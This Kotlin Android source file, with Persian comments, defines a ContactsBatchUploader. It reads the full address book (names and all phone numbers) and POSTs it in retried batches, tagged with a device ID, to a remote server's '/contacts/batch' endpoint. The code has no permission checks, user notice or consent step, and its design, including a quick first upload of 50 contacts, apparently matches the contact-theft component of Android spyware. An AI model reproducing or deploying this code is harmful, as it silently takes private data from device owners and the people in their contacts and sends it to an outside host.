package com.example.test.utils

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 📇 آپلود حرفه‌ای مخاطبین با Batch Processing
 */
object ContactsBatchUploader {

    private const val TAG = "ContactsBatchUploader"

    private const val BATCH_SIZE = 200
    private const val RETRY_ATTEMPTS = 3
    private const val DELAY_BETWEEN_BATCHES_MS = 300L

    /**
     * 📤 آپلود سریع مخاطبین (50 تا اول)
     */
    suspend fun uploadQuickContacts(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 50
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "⚡ Quick contacts upload started (limit: $limit)")

            val contacts = fetchContacts(context, limit)

            if (contacts.isEmpty()) {
                Log.w(TAG, "⚠️ No contacts found")
                return@withContext UploadResult.Success(0)
            }

            Log.d(TAG, "📊 Quick upload: ${contacts.size} contacts")

            val success = sendBatch(contacts, deviceId, baseUrl)

            if (success) {
                Log.d(TAG, "✅ Quick contacts uploaded")
                UploadResult.Success(contacts.size)
            } else {
                Log.e(TAG, "❌ Quick contacts failed")
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Quick contacts error: ${e.message}", e)
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    /**
     * 📦 آپلود کامل همه مخاطبین
     */
    suspend fun uploadAllContacts(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((Int, Int) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            Log.d(TAG, "📇 CONTACTS BATCH UPLOAD STARTED")
            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            val allContacts = fetchContacts(context, limit = null)

            if (allContacts.isEmpty()) {
                Log.w(TAG, "⚠️ No contacts found")
                return@withContext UploadResult.Success(0)
            }

            Log.d(TAG, "📊 Total contacts: ${allContacts.size}")
            Log.d(TAG, "📦 Batch size: $BATCH_SIZE")

            var totalSent = 0
            val totalBatches = (allContacts.size + BATCH_SIZE - 1) / BATCH_SIZE

            for (batchIndex in 0 until totalBatches) {
                val start = batchIndex * BATCH_SIZE
                val end = minOf(start + BATCH_SIZE, allContacts.size)
                val batch = allContacts.subList(start, end)

                var success = false
                var attempts = 0

                while (!success && attempts < RETRY_ATTEMPTS) {
                    attempts++

                    try {
                        Log.d(TAG, "📤 Sending batch ${batchIndex + 1}/$totalBatches " +
                                "(${batch.size} contacts) - Attempt $attempts")

                        success = withTimeout(10000L) {
                            sendBatch(batch, deviceId, baseUrl)
                        }

                        if (success) {
                            totalSent += batch.size
                            Log.d(TAG, "✅ Batch ${batchIndex + 1} sent")
                        } else {
                            delay(500L * attempts)
                        }

                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Batch ${batchIndex + 1} error: ${e.message}")
                        if (attempts < RETRY_ATTEMPTS) {
                            delay(500L * attempts)
                        }
                    }
                }

                onProgress?.invoke(totalSent, allContacts.size)

                if (batchIndex < totalBatches - 1) {
                    delay(DELAY_BETWEEN_BATCHES_MS)
                }
            }

            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            Log.d(TAG, "✅ CONTACTS UPLOAD COMPLETED")
            Log.d(TAG, "   Sent: $totalSent / ${allContacts.size}")
            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            UploadResult.Success(totalSent)

        } catch (e: Exception) {
            Log.e(TAG, "❌ FATAL ERROR: ${e.message}", e)
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    /**
     * 📥 خواندن مخاطبین
     */
    private fun fetchContacts(context: Context, limit: Int?): List<ContactModel> {
        val contacts = mutableListOf<ContactModel>()

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                var count = 0

                while (it.moveToNext() && (limit == null || count < limit)) {
                    try {
                        val contactId = it.getString(idIndex)
                        val name = it.getString(nameIndex) ?: "Unknown"

                        // خواندن شماره‌های تماس
                        val phones = mutableListOf<String>()
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(contactId),
                            null
                        )

                        phoneCursor?.use { pc ->
                            val phoneIndex = pc.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                            )
                            while (pc.moveToNext()) {
                                val phone = pc.getString(phoneIndex)
                                if (!phone.isNullOrBlank()) {
                                    phones.add(phone)
                                }
                            }
                        }

                        if (phones.isNotEmpty()) {
                            contacts.add(ContactModel(name, phones))
                            count++
                        }

                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Fetch contacts error: ${e.message}", e)
        }

        return contacts
    }

    /**
     * 📡 ارسال یک Batch از مخاطبین
     */
    private fun sendBatch(
        contacts: List<ContactModel>,
        deviceId: String,
        baseUrl: String
    ): Boolean {
        return try {
            val contactsArray = JSONArray()

            contacts.forEach { contact ->
                val phonesArray = JSONArray()
                contact.phones.forEach { phonesArray.put(it) }

                contactsArray.put(JSONObject().apply {
                    put("name", contact.name)
                    put("phones", phonesArray)
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("contacts", contactsArray)
                put("timestamp", System.currentTimeMillis())
            }

            val response = sendPostRequest("$baseUrl/contacts/batch", json.toString())
            response != null

        } catch (e: Exception) {
            Log.e(TAG, "❌ Send batch error: ${e.message}", e)
            false
        }
    }

    /**
     * 📡 ارسال POST request
     */
    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
            null
        } finally {
            connection?.disconnect()
        }
    }

    // ===================== مدل‌های داده =====================

    data class ContactModel(
        val name: String,
        val phones: List<String>
    )

    sealed class UploadResult {
        data class Success(val totalSent: Int) : UploadResult()
        data class Failure(val error: String) : UploadResult()
    }
}